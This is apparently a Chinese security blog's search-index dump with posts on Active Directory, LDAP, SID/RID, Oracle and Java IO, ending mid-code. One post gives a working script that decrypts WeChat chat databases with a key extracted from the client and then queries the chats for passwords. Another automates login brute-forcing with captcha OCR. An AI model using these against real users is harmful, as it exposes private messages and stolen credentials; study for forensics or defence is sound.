类是用来支持分组管理的）的实例，而域组的作用类型是由其 groupType 属性决定的，该属性是一个位属性。 十六进制值 十进制值 说明 0x00000001 1 指定一个组为系统创建的组 0x00000002 2 指定一个组为全局组 0x00000004 4 指定一个组为域本地组 0x00000008 8 指定一个组为通用组 0x00000010 16 为 Windows Server 授权管理器指定一个 APP_BASIC 组 0x00000020 32 为 Windows Server 授权管理器指定一个 APP_QUERY 组 0x80000000 2147483648 指定一个组为安全组，如果未设置此位标志，则该组默认是通讯组 常见的系统内置的域本地组及其权限如下： Administrators：管理员组，该组的成员可以不受限制地访问域中资源，是域林强大的服务管理组 Print Operators：打印机操作员组，该组地成员可以管理网络中的打印机，还可以在本地登录和关闭域控制器 Backup Operators：备份操作员组，该组的成员可以在域控制器中执行备份和还原操作，还可以在本地登录和关闭域控制器（其成员可以远程备份必要的注册表配置单元以转储 SAM 和 LSA 机密，然后进行 DCSync） Remote Desktop Users：远程登陆组，只有该组的成员才有远程登陆服务的权限 Account Operators：账号操作员组，该组的成员可以创建和管理该域中的用户和组，还为其设置权限，也可以在本地登录域控制器，如果获得 Acount Operators 组用户就可以获得域内除了域控的所有主机权限。（基于资源的约束性委派） Server Operators：服务器操作员组，该组的成员可以管理域服务器","categories":[{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"}],"tags":[{"name":"user group","slug":"user-group","permalink":"http://example.com/tags/user-group/"}]},{"title":"Active directory","slug":"active-directory","date":"2023-03-26T05:30:53.000Z","updated":"2024-06-28T09:23:10.764Z","comments":true,"path":"2023/03/26/active-directory/","permalink":"http://example.com/2023/03/26/active-directory/","excerpt":"","text":"安装在域控上，为整个域环境提供集中式目录管理服务的组件。其中存储了域环境中各种对象的信息，如：域、用户、用户组、计算机、安全策略等 Active directory 的数据存储在域控器的 Ntds.dit 文件中 Active directory function集中管理计算机、用户、资源、环境、应用。例如：对域内计算机统一下发组策略、对用户进行统一身份认证、统一域内网络连接配置及安全配置、统一更新安全补丁或推送软件等 Ntds.dit file该文件是域控中的二进制文件，是主要的活动目录数据库，其路径为%SystemRoot%\\ntds\\ntds.dit，其中存储有关域用户、用户密码的哈希散列值、用户组、组成员身份和组策略的信息。其加密方式是使用存储在系统SYSTEM文件的密钥对这些哈希值进行加密，非域环境中，用户凭据等信息是存储在本地SAM文件中 Directory Service and LDAP 活动目录是一种目录服务数据库，目录数据库将所有数据组织成一个有层次的树状结构，其中每个节点就是一个对象，有关这个对象的所有信息作为这个对象的属性被存储 LDAP是用来访问目录服务数据库的一个协议，活动目录就是利用LDAP名称路径来描述对象在活动目录中的位置 LDAP： 目录树：在一个目录数据库中，整个目录中的消息集可以表示为一个目录信息树。树中的每一个节点是一个条目 条目：目录数据库中的每个条目就是一条记录。每个条目有自己的唯一绝对可辨识名称（DN） 绝对可辨识名称（DN）：指向一个LDAP对象的完整路径，DN由对象本体开始，向上延伸到域顶级的DNS命名空间。CN代表通用名，OU代表着组织单位，DC代表域组件。 相对可辨识名称（RDN）：用于指向一个LDAP对象的相对路径。 属性：用于描述数据库中每个条目的具体信息 例如上图绝对可辨识名称（DN）可以为：ou=people,dc=wikipedoa,dc=org Active Directory access正常情况（非渗透测试）下可使用微软官方的连接工具：AD EXplorer 来访问活动目录，可以在域中的任意主机，以域用户身份连接域控制器进行查看域中的各种信息，正常情况下根据权限不同，可以执行不同的操作。 点击此处查看：普通域用户添加机器到域中实验 Active directory partition 活动目录预定义了域分区、配置分区和架构分区三个区域 Domain NC用于存储与该域有关的对象信息，这些信息是特定于该域的，如该域中的计算机、用户、组、组织单位等信息。在域林中，每个域的域控制器各自拥有一份属于自己的域分区，只会被复制到本域的所有域控制器中 域分区有如下内容： CN=Builtin：内置了本地域组的安全组的容器 CN=Computers：机器用户容器，其中包含所有加入域的主机 OU=ForeignSecurityPrincipals：包含域中所有来自域的林外部域的组中的成员 CN=Managed Service Accounts：托管服务账户的容器 CN=System：各种预配置对象的容器，包含信任对象、DNS对象和组策略对象 CN=Users：用户和组对象的默认容器 下图箭头所指即为 redteam 域的域分区 Configuration NC用于存储整个域林的主要配置信息，包括有关站点、服务、分区和整个活动目录结构的信息。整个域林共享一份相同的配置分区，会被复制到域林中所有的域的域控制器上 下图箭头所指即为 redteam 域的配置分区 Schema NC存储整个域林的架构信息，包括活动目录中所有类、对象和属性的定义数据。整个域林共享一份相同的架构分区，会被复制到林中所有域的所有域控制器中 下图箭头所指即为 redteam 域的架构分区 活动目录的所有类（类可以看作是一组属性的集合）都存储在架构分区中，是架构分区的一个条目，选中条目后，在右窗格会显示描述它的属性，如下图所示 条目具有那些属性是由其所属的类所决定的，例如上图中的 CN=SQLSERVER-2008 是 computer 类的示例，computer 类是存储在架构分区中的一个条目，如下图所示 在LDAP中，类是存在继承关系的，子类可以继承父类的所有属性，而top类是所有类的父类，并且，活动目录中的每个条目都有 objectClass 属性，该属性的值指向该示例对象所继承的所有类 Active directory queryLDAP中有些属性是位属性，它们由一个个位标志构成，不同的位可由不同的数值表示，属性的值位各位值的总和。此时不能再对某属性进行查询，而需要对属性的标志位进行查询。 LDAP bitwise query syntax1&lt;属性名称&gt;:&lt;BitfilterRule-ID&gt;:=&lt;十进制的位值&gt; BitfilterRule-ID 指的就是为查询规则对应的ID，如下表所示： 位查询规则 BitfilterRule-ID LDAP_MATCHING_RULE_BIT_AND 1.2.840.113556.1.4.803 LDAP_MATCHING_RULE_OR 1.2.840.113556.1.4.804 LDAP_MATCHING_RULE_TRANSITIVE_EVAL 1.2.840.113556.1.4.1941 LDAP_MATCHING_RULE_DN_WITH_DATA 1.2.840.113556.1.4.2253 以用户属性 userAccountControl 为例介绍位查询的过程，userAccountControl 是位属性，其中标志位记录了域用户账号的很多属性 属性标志 标志说明 十六进制值 十进制值 SCRIPT 将运行登录脚本 0x0001 1 ACCOUNTDISABLE 已禁用用户账户 0x0002 2 HOMEDIR_REQUIRED 主页文件夹是必需的 0x0008 8 LOCKOUT 用户锁定 0x0010 16 PASSWD_NOTREQD 不需密码 0x0020 32 PASSWD_CANT_CHANGE 用户不能更改密码 0x0040 64 ENCRYPTED_TEXT_PWD_ALLOWED 用户可以发送加密密码 0x0080 128 TEMP_DUPLICATE_ACCOUNT 本地用户账户 0x0100 256 NORMAL_ACCOUNT 表示典型用户的默认账户类型 0x0200 512 INTERDOMAIN_TRUST_ACCOUNT 0x0800 2048 WORKSTATION_TRUST_ACCOUNT 0x1000 4096 SERVER_TRUST_ACCOUNT 该域的域控制器的计算机账户 0x2000 8192 DONT_EXPIRE_PASSWORD 用户密码永不过期 0x10000 65536 MNS_LOGON_ACCOUNT MNS登录账户 0x20000 131072 SMARTCARD_REQUIRED 强制用户使用智能卡登录 0x40000 262144 TRUSTED_FOR_DELEGATION 信任运行服务的服务账户进行Kerberos委派 0x80000 524288 NOT_DELEGATED 0x100000 1048576 USE_DES_KEY_ONLY 将此用户限制为仅使用DES加密类型的密钥 0x200000 2097152 DONT_REQ_PREAUTH 此账户不需要Kerberos预身份验证来登录 0x400000 4194304 PASSWORD_EXPIRED 用户密码已过期 0x800000 8388608 TRUSTED_TO_AUTH_FOR_DELEGATION 账户已启用委派 0x1000000 16777216 例子 账户 T1sts 的 userAccountControl 属性只有 HOMEDIR_REQUIRED 和 MNS_LOGON_ACCOUNT 两个位置有值，那么用户 T1sts 的 userAccountControl 属性的值为：0x0008 + 0x20000，转为十进制为：131080 现在要查询域中所有设置 HOMEDIR_REQUIRED 和 MNS_LOGON_ACCOUNT位的对象就是查询 userAccountControl 属性的值 131080 的对象，查询语句如下： 1(userAccountControl:1.2.840.113556.1.4.803:=131080) AdFind Queries the active directory 可在域内任意主机上使用，域渗透使用较多 12345AdFind.exe [switches] [-b basedn] [-f filter] [attr list]-b：指定指定一个 BaseDN 基础可分辨名称作为查询的根节点-f：LDAP 过滤条件attr list：需要显示的属性 详情可参考文章：内网渗透测试：活动目录 Active Directory 的查询 - FreeBuf网络安全行业门户","categories":[{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"}],"tags":[{"name":"Active directory","slug":"Active-directory","permalink":"http://example.com/tags/Active-directory/"},{"name":"LDAP","slug":"LDAP","permalink":"http://example.com/tags/LDAP/"},{"name":"Domain","slug":"Domain","permalink":"http://example.com/tags/Domain/"}]},{"title":"Machine user & Domain user","slug":"Machine-user-Domain-user","date":"2023-03-07T15:14:44.000Z","updated":"2024-06-27T14:46:26.332Z","comments":true,"path":"2023/03/07/Machine-user-Domain-user/","permalink":"http://example.com/2023/03/07/Machine-user-Domain-user/","excerpt":"","text":"Domain user域环境中的用户，在域控制器中被创建，并且其所有信息都保存在活动目录中。域用户账户位于域的全局组 Domain Users 中，而计算机本地用户账户位于本地 User 组中。当计算机加入域时，全局组 Domain Users 会被添加到计算机本地的 User 组中。因此，域用户可以在域中的任何一台计算机上登录。 查看所有域用户 1net user /domian Machine user机器用户是一种特殊的域用户，域用户有的属性，机器用户都有。在域环境中，计算机上的本地用户 SYSTEM 对应域中的机器账户，在域中的用户名就是机器名+$。当获取到一台与域中主机控制权后，发现没有域中用户凭据，此时可以利用一些系统提权方法，将当前用户提升到 SYSTEM，以机器账户权限进行域内操作。 查看所有机器用户 1net group &quot;Domain Computers&quot; /domain","categories":[{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"}],"tags":[{"name":"Users","slug":"Users","permalink":"http://example.com/tags/Users/"}]},{"title":"微信聊天取证","slug":"微信聊天取证","date":"2023-01-05T05:30:12.000Z","updated":"2024-04-29T05:40:03.889Z","comments":true,"path":"2023/01/05/微信聊天取证/","permalink":"http://example.com/2023/01/05/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E5%8F%96%E8%AF%81/","excerpt":"","text":"声明：本文章仅学习使用，禁止从事非法测试，如因此产生一切不良后果与文章作者无关 前提条件 微信处于登陆状态 微信版本低于3.8.1.26 说明 版本 &lt; 3.7.0.30 只运行不登录能获取个人信息，登录后可以获取数据库密钥 版本 &gt; 3.7.0.30 只运行不登录不能获取个人信息，登录后都能获取 低于3.7.0.30版本会直接返回邮箱地址，大于3.7.0.30版本则不显示任何信息 步骤运行解密软件运行软件，会显示进程id、当前版本、微信昵称、微信账号、手机号、以及数据库密钥 寻找聊天记录寻找聊天记录，默认在C:\\\\Users\\\\计算机用户名\\\\Documents\\\\Wechat Files文件夹下 若用户太多，可打开C:\\\\Users\\\\计算机用户名\\\\Documents\\\\WeChat Files\\\\wxid\\_手动打码\\\\Msg\\\\Multi文件夹，查看MSG2.db的修改时间来判断是否为当前登陆用户。 聊天记录文件：MSG.db，超出240MB会自动生成MSG1.db，以此类推 12345wxid_xxxxxxxx\\Msg\\Multi\\MSG0.db &gt; 聊天记录wxid_xxxxxxxx\\Msg\\Multi\\MSG1.db &gt; 聊天记录wxid_xxxxxxxx\\Msg\\Multi\\MSG2.db &gt; 聊天记录wxid_xxxxxxxx\\Msg\\MicroMsg.db &gt; Contact字段 &gt; 好友列表wxid_xxxxxxxx\\Msg\\MediaMsg.db &gt; 语音 &gt; 格式为silk 解密数据库随后开始解密数据库，解密脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from Crypto.Cipher import AESimport hashlib, hmac, ctypes, sys, getoptSQLITE_FILE_HEADER = bytes(&#x27;SQLite format 3&#x27;, encoding=&#x27;ASCII&#x27;) + bytes(1)IV_SIZE = 16HMAC_SHA1_SIZE = 20KEY_SIZE = 32DEFAULT_PAGESIZE = 4096DEFAULT_ITER = 64000opts, args = getopt.getopt(sys.argv[1:], &#x27;hk:d:&#x27;)input_pass = &#x27;&#x27;input_dir = &#x27;&#x27;for op, value in opts: if op == &#x27;-k&#x27;: input_pass = value else: if op == &#x27;-d&#x27;: input_dir = valuepassword = bytes.fromhex(input_pass.replace(&#x27; &#x27;, &#x27;&#x27;))with open(input_dir, &#x27;rb&#x27;) as (f): blist = f.read()print(len(blist))salt = blist[:16]key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, password, salt, DEFAULT_ITER, KEY_SIZE)first = blist[16:DEFAULT_PAGESIZE]mac_salt = bytes([x ^ 58 for x in salt])mac_key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, key, mac_salt, 2, KEY_SIZE)hash_mac = hmac.new(mac_key, digestmod=&#x27;sha1&#x27;)hash_mac.update(first[:-32])hash_mac.update(bytes(ctypes.c_int(1)))if hash_mac.digest() == first[-32:-12]: print(&#x27;Decryption Success&#x27;)else: print(&#x27;Password Error&#x27;)blist = [blist[i:i + DEFAULT_PAGESIZE] for i in range(DEFAULT_PAGESIZE, len(blist), DEFAULT_PAGESIZE)]with open(input_dir, &#x27;wb&#x27;) as (f): f.write(SQLITE_FILE_HEADER) t = AES.new(key, AES.MODE_CBC, first[-48:-32]) f.write(t.decrypt(first[:-48])) f.write(first[-48:]) for i in blist: t = AES.new(key, AES.MODE_CBC, i[-48:-32]) f.write(t.decrypt(i[:-48])) f.write(i[-48:]) 运行python3 key.py -k 数据库密钥 -d MSG2.db，出现Decrption Success即算成功 查找聊天记录将其拖入Navicat中即可访问 查找敏感信息语句：SELECT * FROM &quot;MSG&quot; WHERE StrContent like&#39;%密码%&#39; 参考参考文章：红队攻防之PC端微信个人信息与聊天记录取证 工具：SharpWxDump","categories":[{"name":"实用技巧","slug":"实用技巧","permalink":"http://example.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"电子取证","slug":"电子取证","permalink":"http://example.com/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"}]},{"title":"SID & RID","slug":"SID-RID","date":"2023-01-03T15:06:35.000Z","updated":"2024-06-27T14:46:37.933Z","comments":true,"path":"2023/01/03/SID-RID/","permalink":"http://example.com/2023/01/03/SID-RID/","excerpt":"","text":"SID简介 标识用户、组和计算机账户的唯一的号码 每次用户登录时，系统为该用户创建一个访问令牌。访问令牌包含用户的 SID、用户权限和该用户所属的任何组的 SID。此令牌相当于用户访问系统资源的票证 当用户访问系统资源时，会将访问令牌提供给Windows NT，由Windows NT检测用户要访问的对象的访问控制列表ACL上是否此用户被允许对该资源访问，如果有，Windowx NT将会根据表中该用户所拥有的权限，将权限分配给该用户 SID 的一个重要属性是其在时间和地点上的唯一性。SID 在创建它的环境中（在域中 或在本地计算机上）是唯一的。它在时间上也是唯一的：如果您创建一个用户对象，将其删除，然后使用相同的名称重新创建它，则新对象将不会具有与原始对象相同的 SID。操作系统中的进程是根据用户的SID判断用户的权限的，而不是用户或组名 组成一个经典的SID如下所示，它遵循的模式是：S－R－IA－SA－SA－RID 1S-1-5-21-1576590859-2219829432-1450006054-1001 模式 说明 S 首字母S将后面的字符串标识为SID R（Revision修订） Windows生成的所有SID都使用修订级别 1 IA（颁发机构） 标识符权限值。这是发布 SID 的顶级权限的预定义标识符。通常为 5，代表 SECURITY_NT_AUTHORITY，但是，代表已知组和账户的SID例外 SA（子机构） 此部分是域或本地计算机标识符（在本例中为本地标识符）这是一个 48 位字符串，用于标识创建 SID 的机构（计算机或域） RID（相对ID） 是SA所指派的一个惟一的、顺序的编号、代表一个安全主体（比如一个用户、计算机或组） RID指派给用户、计算机和组的RID从1000开始。500-999的RID被专门保留起来、表示在每个Windows计算机和域中通用的账户和组，它们称为“已知RID”有些已知RID会附加到一个域SID上，从而构成一个惟一的标识符。另一些则附加到Builtin SID(S-1-5-32)上，指出它们是可能具有特权的Builtin账户——特权要么是硬编码到操作系统中的，要么是在安全数据库中指派的 常见的RID： 500 - 管理员 519 - EA 501 - Guest","categories":[{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"}],"tags":[{"name":"RID","slug":"RID","permalink":"http://example.com/tags/RID/"},{"name":"SID","slug":"SID","permalink":"http://example.com/tags/SID/"}]},{"title":"Oracle报错解决:ORA-12537","slug":"Oracle报错解决-ORA-12537","date":"2022-11-16T05:04:50.000Z","updated":"2024-04-29T05:13:56.880Z","comments":true,"path":"2022/11/16/Oracle报错解决-ORA-12537/","permalink":"http://example.com/2022/11/16/Oracle%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3-ORA-12537/","excerpt":"","text":"错误针对物理机连接虚拟机出现错误：ORA-12537:TNS:connection closed 解决 以管理员身份打开 cmd 输入命令lsnrctl status，查看当前监听状态 重点需关注的内容：监听程序参数文件、监听端点概要… 监听端点概要中会出现(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=127.0.0.1)(PORT=1521)))这样一段话，我们需要将localhost（127.0.0.1）改为电脑型号 进入监听程序参数文件给出的路径下，将listener.ora和tnsnames.ora文件内HOST&#x3D;xxxxx全改为HOST&#x3D;电脑型号 随后重启服务：lsnrctl stop（关闭监听服务），lsnrctl start（开启监听服务），似乎有更快捷的一个指令即可完成两个操作：lsnrctl reload 重启另一个服务：OracleService数据库名称，例如：net stop oracleServiceXE（关闭服务），net start oracleServiceXE（开启服务 输入lsnrctl status，发现监听端点概要…中localhost已变成电脑型号 此时物理机使用Navicat输入账号密码连接数据库即可 注意事项 关闭防火墙及其相关防护软件 本次Oracle版本为21c 连接成功后过段时间连接不上查看虚拟机IP地址是否发生变化","categories":[{"name":"实用技巧","slug":"实用技巧","permalink":"http://example.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"Oracle","slug":"Oracle","permalink":"http://example.com/tags/Oracle/"}]},{"title":"Burp爆破识别验证码","slug":"Burp爆破识别验证码","date":"2022-10-18T10:42:47.000Z","updated":"2024-04-29T05:30:03.519Z","comments":true,"path":"2022/10/18/Burp爆破识别验证码/","permalink":"http://example.com/2022/10/18/Burp%E7%88%86%E7%A0%B4%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/","excerpt":"","text":"由于之前一直想实现此项技术，在网上也翻看了许多资料，基本都是基于captcha-killer和captcha-killer-modified，结合第三方ocr识别接口来识别图片验证码 以下的步骤使用的框架为xp_CAPTCHA V4.2，使用的接口是ddddocr。 Ocr接口常见的ocr识别接口有三种： 1.ddddocr：可直接输入 pip3 install ddddocr 安装，python版本需为3.8以上 2.muggle-ocr：python3 setup.py install 3.第三方付费接口：框架可以下载 xp_CAPTCHA 接口需付费使用，价格为1块钱识别500次，准确率很高，支持多种验证码格式 配置步骤编辑配置下载上述框架后，编辑 server.py，将主机地址改为本地或服务器 IP，然后运行 server.py 查看配置访问网址127.0.0.1:8899，出现以下界面即配置成功 添加插件 添加标记将需要爆破的地方标记，验证码则填入 @xiapao@1@admin 填入验证码在 xiapao 的地方填入验证码的 URL 设置爆破线程设置相关 Payload，线程只能调成1，否则会失败","categories":[{"name":"实用技巧","slug":"实用技巧","permalink":"http://example.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Java学习-IO流","slug":"Java学习-IO流","date":"2022-02-21T11:59:16.000Z","updated":"2024-05-07T12:07:35.468Z","comments":true,"path":"2022/02/21/Java学习-IO流/","permalink":"http://example.com/2022/02/21/Java%E5%AD%A6%E4%B9%A0-IO%E6%B5%81/","excerpt":"","text":"File类 File 类位于 java.io 包下 File 类的一个对象，对应与操作系统下的一个文件或一个文件目录（或文件夹） File 能新建、删除、重命名文件和目录，但是不能访问文件本身，若需要访问文件内容，需要使用输入&#x2F;输出流 常用方法获取文件和目录基本信息1234567public String getAbsolutePath()：返回文件的绝对路径，包括文件名public File getAbsoluteFile()：返回表示文件绝对路径的 File 对象public String getName()：返回文件或目录的名称public String getParent()：返回文件或目录的父目录的路径，如果没有父目录，则返回 nullpublic String getPath()：返回文件或目录的路径，相对路径或绝对路径都可能public long length()：返回文件的长度，以字节为单位public long lastModified(): 返回文件的上一次修改时间，以毫秒为单位的时间戳 当文件不存在时返回结果如下： 12345678910111213public class Main &#123; public static void main(String[] args) &#123; File file = new File(&quot;hello.txt&quot;); System.out.println(file.getAbsolutePath()); // E:\\Code\\Java_Code\\Java_Study\\hello.txt System.out.println(file.getAbsoluteFile()); // E:\\Code\\Java_Code\\Java_Study\\hello.txt System.out.println(file.getName()); // hello.txt System.out.println(file.getParent()); // null System.out.println(file.getPath()); // hello.txt System.out.println(file.getAbsoluteFile().getParent()); // E:\\Code\\Java_Code\\Java_Study System.out.println(file.length()); // 0 System.out.println(file.lastModified()); // 0 &#125;&#125; 当文件存在时返回结果如下： 12345678910111213public class Main &#123; public static void main(String[] args) &#123; File file = new File(&quot;hello.txt&quot;); System.out.println(file.getAbsolutePath()); // E:\\Code\\Java_Code\\Java_Study\\hello.txt System.out.println(file.getAbsoluteFile()); // E:\\Code\\Java_Code\\Java_Study\\hello.txt System.out.println(file.getName()); // hello.txt System.out.println(file.getParent()); // null System.out.println(file.getPath()); // hello.txt System.out.println(file.getAbsoluteFile().getParent()); // E:\\Code\\Java_Code\\Java_Study System.out.println(file.length()); // 12 System.out.println(file.lastModified()); // 1714288336594 &#125;&#125; 列出下一级目录12345public String[] list()：返回目录中所有文件和子目录的名称数组，如果目录为空或者不是一个目录，则返回 nullpublic String[] list(FilenameFilter f)：返回目录中满足指定文件名过滤器条件的文件和子目录的名称数组，参数 f 是一个文件名过滤器，用于筛选文件和子目录，如果目录为空、不是目录，或者没有匹配的文件和子目录，则返回 nullpublic File[] listFiles()：返回表示目录中所有文件和子目录的 File 对象数组，如果目录为空或者不是一个目录，则返回 nullpublic File[] listFiles(FilenameFilter f)：返回表示目录中满足指定文件名，参数 f 是一个文件名过滤器，用于筛选文件和子目录，如果目录为空、不是目录，或者没有匹配的文件和子目录，则返回 nullpublic File[] listFiles(FileFilter f)：返回表示目录中满足指定文件过滤器条件的文件和子目录的 File 对象数组，参数 f 是一个文件过滤器，用于筛选文件和子目录，如果目录为空、不是目录，或者没有匹配的文件和子目录，则返回 null 123456789101112131415public class Main &#123; public static void main(String[] args) throws IOException &#123; File file = new File(&quot;E:\\\\Code\\\\Java_Code&quot;); String[] list = file.list(); for (String str : list) &#123; System.out.println(str); &#125; File[] files = file.listFiles(); for (File listFile : files) &#123; System.out.println(listFile); System.out.println(listFile.getName()); &#125; &#125;&#125; 重命名功能1public boolean renameTo(File destination)：把文件重命名为指定的文件路径，返回一个 bool 值 想要成功重命名文件，file 必须存在，file1 不能存在， file1 所在的目录必须存在 12345678public class Main &#123; public static void main(String[] args) &#123; File file = new File(&quot;hello.txt&quot;); File file1 = new File(&quot;E:\\\\Code\\\\Java_Code\\\\0428\\\\0428.txt&quot;); boolean result = file.renameTo(file1); System.out.println(result ? &quot;重命名成功&quot; : &quot;重命名失败&quot;); &#125;&#125; 判断功能123456public boolean exists()：此 File 表示的文件或目录是否实际存在public boolean isDirectory()：：此 File 表示的是否为目录。public boolean isFile()：此 File 表示的是否为文件public boolean canRead()：判断是否可读public boolean canWrite()：判断是否可写public boolean isHidden()：判断是否隐藏 当文件或目录不存在时，以下方法的 Bool 值全为Flase 1234567891011public class Main &#123; public static void main(String[] args) &#123; File file = new File(&quot;E:\\\\Code\\\\Java_Code\\\\0428\\\\0428.txt&quot;); System.out.println(file.exists()); //true System.out.println(file.isDirectory()); //false System.out.println(file.isFile()); //true System.out.println(file.canRead()); //true System.out.println(file.canWrite()); //true System.out.println(file.isHidden()); //false &#125;&#125; 创建删除1234public boolean createNewFile()：创建文件。若文件存在，则不创建，返回falsepublic boolean mkdir()：创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建public boolean mkdirs()：创建文件目录。如果上层文件目录不存在，一并创建public boolean delete()：删除文件或者文件夹。删除注意事项：① Java 中的删除不走回收站。② 要删除一个文件目录，请注意该文件目录内不能包含文件或者文件目录 123456789101112131415public class Main &#123; public static void main(String[] args) throws IOException &#123; File file = new File(&quot;E:\\\\Code\\\\Java_Code\\\\0428\\\\0428.txt&quot;); if (!file.exists()) &#123; boolean isSuccessed = file.createNewFile(); if (isSuccessed)&#123; System.out.println(&quot;创建成功&quot;); &#125; &#125;else &#123; System.out.println(&quot;此文件已存在&quot;); boolean delete = file.delete(); System.out.println(delete ? &quot;文件删除成功&quot; : &quot;文件删除失败&quot;); &#125; &#125;&#125; IO流 当完成流的操作时，必须调用 close()方法，释放系统资源，否则会造成内存泄漏 分类数据流向不同可分为： 输入流：把数据从其他设备上读取到内存中的流 输出流：把数据从内存中写出到其他设备上的流 操作单位不同可分为： 字节流：以字节为单位，读写数据的流 字符流：以字符为单位，读写数据的流 IO流角色不同可分为： 节点流：从数据源或目的地读写数据 处理流：不直接连接到数据源或目的地，而是连接在已存在的流（节点流或处理流）之上，通过对数据的处理为程序提供更为强大的读写功能 APIIO流涉及40多个类，实际上非常常规，都是从如下四个抽象基类派生的 抽象基类 输入流 输出流 字节流 InputStream OutputStream 字符流 Reader Writer 由四个抽象基类派生类 分类 字节输入流 字节输出流 字符输入流 字符输出流 抽象基类 InputStream OutputStream Reader Writer 访问文件 FileInputStream FileOutputStream FileReader FileWriter 访问数组 ByteArrayInputStream ByteArrayOutputStream CharArrayReader CharArrayWriter 访问管道 PipedInputStream PipedOutputStream PipedReader PipedWriter 访问字符串 StringReader StringWriter 缓冲流 BufferedInputStream BufferedOutputStream BufferedReader BufferedWriter 转换流 InputStreamReader InputStreamWriter 对象流 ObjectInputStream ObjectOutputStream FilterInputStream FilterOutputStream FilterReader FilterWriter 打印流 PrintStream PrintWriter 推回输入流 PushbackInputStream PushbackReader 特殊流 DataInputStream DataOutputStream 常用节点流 文件流：FileInputStream、FileOutputStrean、FileReader、FileWriter 字节&#x2F;字符数组流：ByteArrayInputStream、ByteArrayOutputStream、CharArrayReader、CharArrayWriter 常用处理流 缓冲流：BufferedInputStream、BufferedOutputStream、BufferedReader、BufferedWriter 转换流：InputStreamReader、OutputStreamReader 对象流：ObjectInputStream、ObjectOutputStream 文件流Reader and WriterReader-说明java.io.Reader抽象类是用于读取字符流的所有类的父类，可以读取字符信息到内存中。它定义了字符输入流的基本共性功能方法 1234public int read()：从输入流读取一个字符。虽然读取了一个字符，但是会自动提升为 int 类型。返回该字符的 Unicode 编码值。如果已经到达流末尾了，则返回-1public int read(char[] cbuf)： 从输入流中读取一些字符，并将它们存储到字符数组 cbuf 中 。每次最多读取 cbuf.length 个字符。返回实际读取的字符个数。如果已经到达流末尾，没有数据可读，则返回-1public int read(char[] cbuf,int off,int len)：从输入流中读取一些字符，并将它们存储到字符数组 cbuf 中，从 cbuf[off]开始的位置存储。每次最多读取len 个字符。返回实际读取的字符个数。如果已经到达流末尾，没有数据可读，则返回-1public void close()：关闭此流并释放与此流相关联的任何系统资源 Writer-说明java.io.Writer 抽象类是表示用于写出字符流的所有类的超类，将指定的字符信息写出到目的地。它定义了字节输出流的基本共性功能方法 1234567public void write(int c)：写出单个字符。public void write(char[] cbuf)：写出字符数组。public void write(char[] cbuf, int off, int len)：写出字符数组的某一部分。off：数组的开始索引；len：写出的字符个数。public void write(String str)：写出字符串。public void write(String str, int off, int len) ：写出字符串的某一部分。off：字符串的开始索引；len：写出的字符个数。public void flush()：刷新该流的缓冲。public void close()：关闭此流。 FileReader and FileWriter 字符流只能用来操作文本文件，不能用来处理非文本文件 流资源的调用，为避免内存泄漏，需要使用 try-catch-finally 处理异常 FileReader-说明 用于读取字符文件，构造时使用系统默认的字符编码和默认字节缓冲区 12FileReader(File file)：创建一个新的 FileReader ，给定要读取的 File 对象FileReader(String fileName)：创建一个新的 FileReader ，给定要读取的文件的名称 FileWriter-说明 用于写出字符到文件，构造时使用系统默认的字符编码 构造器中可指定是否覆盖原有文件 ***FileWriter(File file,false)***，默认为 flase，为true时追加在文件末尾 123FileWriter(File file)：创建一个新的 FileWriter，给定要读取的 File 对象FileWriter(String fileName)：创建一个新的 FileWriter，给定要读取的文件的名称FileWriter(File file,boolean append)：创建一个新的 FileWriter，指明是否在现有文件末尾追加内容 案例案例1-将磁盘文件 hello.txt 写入至内存中1234567891011121314151617181920212223242526272829303132public class Main &#123; public static void main(String[] args) &#123; FileReader fileReader = null; try &#123; // 创建File类对象，对应hello.txt File file = new File(&quot;hello.txt&quot;); // 创建字符输入流 fileReader = new FileReader(file); // 读取hello.txt，并显示在控制台上 char[] cbuffer = new char[5]; int len; while ((len = fileReader.read(cbuffer)) != -1) &#123; for (int i = 0; i &lt; cbuffer.length; i++) &#123; System.out.print(cbuffer[i]); &#125; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; // 流资源关闭操作（必须要关闭，否则会内存泄漏） try &#123; if (fileReader != null) fileReader.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 上述代码中会存在一个问题，文件内容为 “hello world” 而最后遍历出的内容为： “hello worldworl”，这是由于只有11个字符，一次性搬运5个字符，总共需要运三趟。第一次搬运字符为”hello”，第二次为” worl”，第三次为”dworl”，因为它每一趟回去都是覆盖上一次的字符串， 而到第三趟时，字符串只剩下一个了，也就只覆盖一个，然后遍历时遍历的是数组的长度，所以会出现这种错误。 12345while ((len = fileReader.read(cbuffer)) != -1) &#123; for (int i = 0; i &lt; len; i++) &#123; System.out.print(cbuffer[i]); &#125;&#125; 将其中的 “cbuffer.length” 改为 “len” 即可解决问题，通过每次读多少个就遍历多少次。 案例2-复制磁盘文件12345678910111213141516171819202122232425262728293031323334353637public class Main &#123; public static void main(String[] args) &#123; FileReader fileReader = null; FileWriter fileWriter = null; try &#123; File file = new File(&quot;hello.txt&quot;); File file1 = new 